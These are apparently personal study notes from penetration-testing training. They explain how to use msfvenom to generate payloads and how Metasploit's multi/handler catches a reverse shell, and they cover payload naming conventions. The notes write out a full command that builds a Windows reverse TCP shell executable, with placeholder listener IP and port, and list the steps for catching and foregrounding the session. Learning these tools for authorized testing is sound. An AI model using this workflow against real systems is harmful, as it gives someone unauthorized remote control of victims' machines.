## Venom vs Multi/Handler Man
​
The standard syntax for msfvenom is as follows:
​

>[!Tip] Chebra
>```
>msfvenom -p {payload} {options}
>```

​

>[!Example]
>```
>msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST={listen IP} LPORT={listen PORT}
>```

​
Here we are using a payload and four options:
​
- ***-f {format}***: specifies the output format. In this case that is an executable (exe).
- ***-o {file}***: the output location and filename for the generated payload.
- ***LHOST={IP}***: specifies the IP to connect back to.
- ***LPORT={PORT}***: the port on the local machine to connect back to. This can be anything between 0 and 65535 that isn't already in use; however, ==ports below 1024 are restricted== and require a listener running with root privileges.
​

![[Pasted image 20230417132205.png]]

​
A more visual example :D
​
Then if we need to catch, for example, a reverse shell, we can just use our new little friend ==multi/handler==:

1. Run *msfconsole* (with sudo permissions if using a port under 1024)
2. Use *multi/handler*
3. Set *options*
4. Run the *madafaka*
5. *Foreground*: because the multi/handler was originally backgrounded, we needed to use `sessions 1` to foreground it again. This worked as it was the only session running. Had there been other sessions active, we would have needed to use ==sessions== to see all active sessions, then use ==sessions {number}== to select the appropriate session to foreground. This number would also have been displayed in the line where the shell was opened (see "_Command Shell session **1** opened_").



​
​
### Payload Naming Conventions
​

>[!Tip] Chebra
>```
>{OS}/{arch}/{payload}
>```

​

>[!Danger] Exception (Windows 32 bits)
>```
>{OS}/{payload}
>```

​
The ==payload== section of the convention determines if ​is ==stageless or staged==, by the using of one character:
​
- Stageless: ( **_** )
- Staged: ( **/** )
​

>[!Example] Stageless Example
>```
>linux/x86/meterpreter_reverse_tcp
>```

​

>[!Example] Staged Example
>```
>linux/x86/meterpreter/reverse_tcp
>```

​
​
### Where do i find payloads names?
​

>[!Tip] Chebra
>```
>msfvenom --list payloads
>```

​
Combine it with some ==grep==